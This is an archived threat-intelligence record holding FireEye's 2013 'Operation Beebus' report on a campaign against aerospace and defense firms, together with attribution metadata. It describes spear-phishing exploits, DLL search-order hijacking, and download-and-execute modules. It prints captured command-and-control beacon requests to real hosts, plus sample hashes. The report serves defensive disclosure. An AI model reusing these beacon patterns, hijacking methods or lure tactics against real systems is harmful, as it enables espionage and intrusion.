{
    "id": "33c58668-0d51-4a9b-abc7-43a89484d4e9",
    "created_at": "2022-10-25T16:48:15.637766Z",
    "updated_at": "2025-03-27T02:16:53.007278Z",
    "deleted_at": null,
    "sha1_hash": "829bd809578a0305bc0438fd719e9c6da8f9fd96",
    "title": "Operation Beebus",
    "authors": "FireEye",
    "file_creation_date": "2016-04-11T04:41:01Z",
    "file_modification_date": "2016-04-11T04:41:01Z",
    "file_size": 1125200,
    "plain_text": "## OPERATION BEEBUS\n\n[February 01, 2013 | by Vinay Pidathala, Zheng Bu, Thoufique Haq, Darien Kindlund | Targeted Attack](https://www.fireeye.com/blog/threat-research.html/category/etc/tags/fireeye-blog-authors/cap-vinay-pidathala)\n\nFireEye discovered an APT campaign consistently targeting companies in the aerospace and defense industries. The campaign has been in effect for sometime now.\n\n#### Infection Vector\n\nWe have seen this campaign use both email and drive­by downloads as a means of infecting end users. The threat actor has consistently used attachment names of documents/white\npapers released by well­known companies. The malicious email attachment exploits some common vulnerabilities in PDF and DOC files.\n\n\n**PDF:** CVE­2011­0611\n\n**DOC:** CVE­2012­0158\n\n**PDF:** CVE­2009­0927\n\n**DOC:** CVE­2010­3333\n\n**PDF:** CVE­2012­0754\n\n**DOC:**\n\n\nTable 1\n\nThe\n\nmalware uses a well­documented vulnerability in the Windows OS known as DLL search order hijacking. There is an order in which executables load DLLs on the Windows operating\nsystem. This particular malware takes advantage of this vulnerability and drops a DLL called ntshrui.DLL in the C:\\Windows directory. The first place from where the executable looks to load\nthe DLL is its own directory. By dropping the ntshrui.DLL in the directory C:\\Windows, the malware achieves persistence.\n\nFigures 1 and 2 below show the modified weaponized PDF, which was used in the spear phishing attack. The PDF on the left is the non­malicious version, while the one on the right is\nmalicious. As you can see from the pictures below, the original PDF was modified using the Ghostscript tool. Also the size of the malicious PDF is significantly smaller than the non­malicious\nversion.\n\nFigure 1\n\n\n-----\n\nFigure 3. Initial GET request\n\nThe malware communicates with a remote command and control (CnC) server. The GET request in Figure 4 is the initial request that the compromised machine makes to \"check in\" with the\nCnC server. The keyword \"p=2,\" which is sent out as part of the URI, appears to indicate the version of the malware. Mining our database we found three versions of this malware and they\nare noted in the table below. The version value is hard­coded in the ntshrui.DLL file in the samples we observed.\n\nFigure 4. Encrypted data sent to CnC\n\nIt encrypts information it collects with the base64 algorithm and then sends it to the remote CnC server as seen in Figure 4. It is interesting to note that the base64 data is subjected to some\nsubstitutions before it is sent out preventing run of the mill inspection on the wire. It replaces the ‘/’ (forward slash) and ‘+’ (plus) characters which are part of the base64 character set with ‘_’\n(underscore) and ‘­‘ (hyphen) respectively. The code that performs this operation is shown in Figure 5.\n\nFigure 5\n\nA sample of the data that is encrypted and sent to the CnC server for version ‘p=2’ is seen in the memory dump shown in Figure 6. At offset 4­7 it contains a time­based counter. It uses the\nkeyword \"osamu\" in this instance to identify this particular campaign. The campaign keywords are not sent out in version ‘p=1’ but can still be found hardcoded in the DLL payload. The\nhostname and OS information are also included in the beacon. It awaits further commands from the CnC server in response to the data sent out.\n\nFigure 6\n\nIt has modules to capture system information (processor, disk, memory, OS), process id, process start time, and current user information. It also contains a module to download and execute\nadditional payloads and updates. It downloads in to %TEMP% directory and calls CreateProcessA to invoke execution as seen below:\n\nFigure 7\n\nFigure 8\n\n\n-----\n\nHTTP/1.1\n\nUser­Agent: Mozilla/4.0 (compatible; )\n\nAccept: */*\n\nHost:\n\nContent­Length: 563\n\nConnection: Keep­Alive\n\nCache­Control: no­cache\n\nThe malware collects the following information from the compromised machine.\n\n1)  Type of Processor\n\n2)  CPU Speed\n\n3)  Figures out the product type by querying the \\SYSTEM\\CurrentControlSet\\Control\\ProductOptions\\ProductType registry key.\n\n4)  Memory Usage\n\nFigure 9\n\nThe malware is fairly noisy sending multiple GET requests. In our test environment we observed that the POST request started a couple of hours after the malware initially checked in with\nthe CnC. Around the same time we also noticed a new exe get dropped under \"C:\\Documents And Settings\\Administrator\\Local Setting\\Temp~ISUN32.exe\". The two figures below show the\nISUN32.exe process start up and the exe get dropped under TEMP directory.\n\nFigure 10\n\nFigure 11\n\n\n-----\n\ncom for more information.\n\nsensor environments.doc\n\nGlobal_A&D_outlook_2012.pdf\n\nFY2013_Budget_Request .doc\n\nUnderstand your blood test report.pdf\n\nRHT_SalaryGuide_2012.pdf\n\nSecurity Predictions for 2012 and 2013.pdf\n\nApril Is the Cruelest Month.pdf\n\nNational Human Rights Action Plan of China (2012­2015).pdf\n\nDept of Defense FY12 A STTR Solicitation Topics of Interest to Boeing.pdf\n\nBoeing_Current_Market_Outlook_2011_to_2030.pdf\n\nRHT_SalaryGuide_2012.pdf\n\ndodd­frank­conflict­minerals.doc\n\nConflict­Minerals­Overview­for­KPMG.doc\n\nсообщить.doc\n\n**Timeline of the Beebus Campaign**\n\nFrom the timeline below, we were able to figure out that this campaign has been targeting companies in the Aerospace and Defense vertical in waves. There is no specific pattern to this\nattack, we have seen days on which multiple weaponized emails were sent to several companies, and on other days we observed that the threat actor sent only one email to a specific target\norganization. The chart below shows Beebus attacks in the last year.\n\nORIGIN/THREAT ACTOR ATTRIBUTION:\n\n[The term \"Beebus\" was coined from an initial sample in this campaign (MD5: 7ed557921ac60dfcb295ebabfd972301), which was originally submitted to VirusTotal on April 12, 2011.[1] After](https://www.virustotal.com/search/query=7ed557921ac60dfcb295ebabfd972301)\nthis executable compromises the endpoint, this sample then generated command and control traffic to:\n\nGET /s/asp?XAAAAM4w5jmOS_kMZlr67o8jettxsYA8dZgeNAHes­Nn5p­6AFUD6yncpz5AL6wAAA==p=1 HTTP/1.1\n\nUser­Agent: Mozilla/4.0 (compatible; )\n\nAccept: */*\n\nHost: bee.businessconsults.net\n\nAs early as March 2011 Joe Stewart at Dell SecureWorks reported that various subdomains off the primary domain of \"businessconsults net\" have acted as command and control nodes for\n\n\n-----\n\nAs such, this TTP of obfuscated/encrypted HTML comments has been also widely reported in the media as associated with the nation state group called \"Comment Group\" or \"Comment\nTeam,\" which is believed to be associated with the Chinese government.[4] Bloomberg reports that various US intelligence sources have labeled this activity as \"Byzantine Candor\",\naccordingly.[5]\n\nBased upon these correlations, we believe Beebus to be yet another TTP associated with threat actors based in China.\n\nAnother related sample (MD5: d7ec457be3fad8057580e07cae74becb) was originally submitted to VirusTotal on Sept. 23, 2011[6] and generates the following\n\n\"Beebus\" traffic pattern:\n\nGET /s/asp?XAAAAM4w5jmIa_kMZlr67o8jettxsYA8dZgeNAHes­Nn5p­6AFUD6yncpz5AL6wAAA==p=1 HTTP/1.1\n\nUser­Agent: Mozilla/4.0 (compatible; )\n\nAccept: */*\n\nHost: 68.96.31.136\n\nSiilarly, the IP address (68.96.31.136) was another C2 node reported by Dell SecureWorks as hosting the HTran proxy infrastructure.[7]\n\n[[1]https://www.virustotal.com/search/query=7ed557921ac60dfcb295ebabfd972301](https://www.virustotal.com/search/?query=7ed557921ac60dfcb295ebabfd972301)\n\n[[2]](http://www.secureworks.com/cyber-threat-intelligence/threats/htran/) [http://www.secureworks.com/cyber­threat­intelligence/threats/htran/](http://www.secureworks.com/cyber-threat-intelligence/threats/htran/)\n\n[3] [http://www.mcafee.com/us/resources/white­papers/wp­operation­shady­rat.pdf](http://www.mcafee.com/us/resources/white-papers/wp-operation-shady-rat.pdf)\n\n[4] [http://www.bloomberg.com/news/2012­07­26/china­hackers­hit­eu­point­man­and­d­c­with­byzantine­candor.html](http://www.bloomberg.com/news/2012-07-26/china-hackers-hit-eu-point-man-and-d-c-with-byzantine-candor.html)\n\n[5] [http://www.bloomberg.com/news/2012­07­26/china­hackers­hit­eu­point­man­and­d­c­with­byzantine­candor.html](http://www.bloomberg.com/news/2012-07-26/china-hackers-hit-eu-point-man-and-d-c-with-byzantine-candor.html)\n\n[6] [https://www.virustotal.com/search/query=d7ec457be3fad8057580e07cae74becb](https://www.virustotal.com/search/query=d7ec457be3fad8057580e07cae74becb)\n\n[[7]http://www.secureworks.com/cyber­threat­intelligence/threats/htran/](http://www.secureworks.com/cyber-threat-intelligence/threats/htran/)\n\n_This post was written by FireEye researchers Darien Kindlund, Vinay Pidathala, and Thoufique Haq._\n\n[This entry was posted on Fri Feb 01 15:56:30 EST 2013 and filed under Advanced Persistent Threat, Beebus, Blog, Darien Kindlund, Targeted Attack, Thoufique Haq, Vinay Pidathala and](https://www.fireeye.com/blog/threat-research.html/category/etc/tags/fireeye-blog-tags/advanced-persistent-threat)\n[Zheng Bu.](https://www.fireeye.com/blog/threat-research.html/category/etc/tags/fireeye-blog-authors/cap-zheng-bu)\n\n\n[Products](https://www.fireeye.com/products.html)\n\n[Solutions](https://www.fireeye.com/solutions.html)\n\n[Mandiant Consulting](https://www.fireeye.com/services.html)\n\n[Current Threats](https://www.fireeye.com/current-threats.html)\n\n[Partners](https://www.fireeye.com/partners.html)\n\n[Support](https://www.fireeye.com/support.html)\n\n[Company](https://www.fireeye.com/company.html)\n\n[Careers](https://www.fireeye.com/company/jobs.html)\n\n[Press Releases](https://www.fireeye.com/company/press-releases.html)\n\n[Webinars](https://www.fireeye.com/company/webinars.html)\n\n[Events](https://www.fireeye.com/company/events.html)\n\n[Investor Relations](http://investors.fireeye.com/)\n\n\n-----\n\n[Communication Preferences](https://www2.fireeye.com/manage-your-preferences.html)\n\n[Report Security Issue](https://www.fireeye.com/company/security.html)\n\n[Supplier Documents](https://www.fireeye.com/company/supplier.html)\n\n[Legal Documentation](https://www.fireeye.com/company/legal.html)\n\n\n###       \n\n\n[LinkedIn](https://www.linkedin.com/company/fireeye)\n\n[Twitter](https://twitter.com/fireeye)\n\n[Facebook](https://www.facebook.com/FireEye)\n\n[Google+](https://plus.google.com/+Fireeye/posts)\n\n[YouTube](https://www.youtube.com/user/FireEyeInc)\n\n[Podcast](https://itunes.apple.com/us/podcast/eye-on-security/id1073779629?mt=2)\n\n[Glassdoor](http://www.glassdoor.com/Overview/Working-at-FireEye-EI_IE235161.11,18.htm)\n\n\n**Contact Us:**\n877­FIREEYE (877­347­3393)\n\nCopyright © 2016 FireEye, Inc. All rights reserved.\n\n[Privacy & Cookies Policy | Safe Harbor](https://www.fireeye.com/company/privacy.html)\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "d63ae2b7-445f-460d-965d-2676dacdb6de",
            "created_at": "2022-10-25T15:59:19.552139Z",
            "updated_at": "2022-10-25T15:59:19.552139Z",
            "deleted_at": null,
            "name": "APTnotes",
            "url": "https://github.com/aptnotes/data",
            "description": "APTnotes data",
            "reports": null
        }
    ],
    "references": [
        "https://app.box.com/s/3bk8cfcjiwhh1gxlkmyslrmp85wm7ewd"
    ],
    "report_names": [
        "FireEye_Operation-Beebus(Feb-1-13)"
    ],
    "threat_actors": [
        {
            "id": "b7aa23d0-65c8-49f4-8052-837ce6251b63",
            "created_at": "2022-10-25T16:07:24.006105Z",
            "updated_at": "2025-03-27T02:02:10.072487Z",
            "deleted_at": null,
            "main_name": "Operation Shady RAT",
            "aliases": [],
            "source_name": "ETDA:Operation Shady RAT",
            "tools": [],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "d18fe42c-8407-4f96-aee0-a04e6dce219a",
            "created_at": "2023-01-06T13:46:38.275292Z",
            "updated_at": "2025-03-27T02:00:02.79092Z",
            "deleted_at": null,
            "main_name": "APT12",
            "aliases": [
                "Calc Team",
                "IXESHE",
                "BRONZE GLOBE",
                "BeeBus",
                "DynCalc",
                "DNSCalc",
                "Crimson Iron",
                "NUMBERED PANDA",
                "TG-2754",
                "Group 22"
            ],
            "source_name": "MISPGALAXY:APT12",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "aa73cd6a-868c-4ae4-a5b2-7cb2c5ad1e9d",
            "created_at": "2022-10-25T16:07:24.139848Z",
            "updated_at": "2025-03-27T02:02:10.120505Z",
            "deleted_at": null,
            "main_name": "Safe",
            "aliases": [],
            "source_name": "ETDA:Safe",
            "tools": [
                "DebugView",
                "LZ77",
                "OpenDoc",
                "SafeDisk",
                "TypeConfig",
                "UPXShell",
                "UsbDoc",
                "UsbExe"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "dabb6779-f72e-40ca-90b7-1810ef08654d",
            "created_at": "2022-10-25T15:50:23.463113Z",
            "updated_at": "2025-03-27T02:00:55.47619Z",
            "deleted_at": null,
            "main_name": "APT1",
            "aliases": [
                "APT1",
                "Comment Crew",
                "Comment Group",
                "Comment Panda"
            ],
            "source_name": "MITRE:APT1",
            "tools": [
                "Seasalt",
                "ipconfig",
                "Cachedump",
                "PsExec",
                "GLOOXMAIL",
                "Lslsass",
                "PoisonIvy",
                "WEBC2",
                "Mimikatz",
                "gsecdump",
                "Pass-The-Hash Toolkit",
                "Tasklist",
                "xCmd",
                "pwdump"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "cf7fc640-acfe-41c4-9f3d-5515d53a3ffb",
            "created_at": "2023-01-06T13:46:38.228042Z",
            "updated_at": "2025-03-27T02:00:02.775905Z",
            "deleted_at": null,
            "main_name": "APT1",
            "aliases": [
                "GIF89a",
                "G0006",
                "PLA Unit 61398",
                "Group 3",
                "TG-8223",
                "Comment Group",
                "ShadyRAT",
                "COMMENT PANDA",
                "Comment Crew",
                "Byzantine Candor",
                "Brown Fox"
            ],
            "source_name": "MISPGALAXY:APT1",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "c5f79f58-db78-4cd7-88cf-c029a2199360",
            "created_at": "2022-10-25T16:07:23.325227Z",
            "updated_at": "2025-03-27T02:02:09.738383Z",
            "deleted_at": null,
            "main_name": "APT 12",
            "aliases": [
                "APT 12",
                "BeeBus",
                "Bronze Globe",
                "CTG-8223",
                "Calc Team",
                "Crimson Iron",
                "DNSCalc",
                "DynCALC",
                "Group 22",
                "Numbered Panda"
            ],
            "source_name": "ETDA:APT 12",
            "tools": [
                "AUMLIB",
                "ETUMBOT",
                "Exploz",
                "Graftor",
                "HIGHTIDE",
                "IHEATE",
                "IXESHE",
                "RIPTIDE",
                "RapidStealer",
                "Specfix",
                "THREEBYTE",
                "bbsinfo",
                "mswab",
                "yayih"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "3aaf0755-5c9b-4612-9f0e-e266ef1bdb4b",
            "created_at": "2022-10-25T16:07:23.480196Z",
            "updated_at": "2025-03-27T02:02:09.826059Z",
            "deleted_at": null,
            "main_name": "Comment Crew",
            "aliases": [
                "APT 1",
                "BrownFox",
                "Byzantine Candor",
                "Byzantine Hades",
                "Comment Crew",
                "Comment Panda",
                "GIF89a",
                "Group 3",
                "Operation Oceansalt",
                "Operation Seasalt",
                "Operation Siesta",
                "Shanghai Group",
                "TG-8223"
            ],
            "source_name": "ETDA:Comment Crew",
            "tools": [
                "Auriga",
                "Cachedump",
                "Chymine",
                "CookieBag",
                "Darkmoon",
                "GDOCUPLOAD",
                "GLOOXMAIL",
                "GREENCAT",
                "Gen:Trojan.Heur.PT",
                "GetMail",
                "Hackfase",
                "Hacksfase",
                "Helauto",
                "Kurton",
                "LETSGO",
                "LIGHTBOLT",
                "LIGHTDART",
                "LOLBAS",
                "LOLBins",
                "LONGRUN",
                "Living off the Land",
                "Lslsass",
                "MAPIget",
                "ManItsMe",
                "Mimikatz",
                "MiniASP",
                "Oceansalt",
                "Pass-The-Hash Toolkit",
                "Poison Ivy",
                "ProcDump",
                "Riodrv",
                "SPIVY",
                "Seasalt",
                "ShadyRAT",
                "StarsyPound",
                "TROJAN.COOKIES",
                "TROJAN.FOXY",
                "TabMsgSQL",
                "Tarsip",
                "Trojan.GTALK",
                "WebC2",
                "WebC2-AdSpace",
                "WebC2-Ausov",
                "WebC2-Bolid",
                "WebC2-Cson",
                "WebC2-DIV",
                "WebC2-GreenCat",
                "WebC2-Head",
                "WebC2-Kt3",
                "WebC2-Qbp",
                "WebC2-Rave",
                "WebC2-Table",
                "WebC2-UGX",
                "WebC2-Yahoo",
                "Wordpress Bruteforcer",
                "bangat",
                "gsecdump",
                "pivy",
                "poisonivy",
                "pwdump",
                "zxdosml"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1666716495,
    "ts_updated_at": 1743041813,
    "ts_creation_date": 1460349661,
    "ts_modification_date": 1460349661,
    "files": {
        "pdf": "https://archive.orkl.eu/829bd809578a0305bc0438fd719e9c6da8f9fd96.pdf",
        "text": "https://archive.orkl.eu/829bd809578a0305bc0438fd719e9c6da8f9fd96.txt",
        "img": "https://archive.orkl.eu/829bd809578a0305bc0438fd719e9c6da8f9fd96.jpg"
    }
}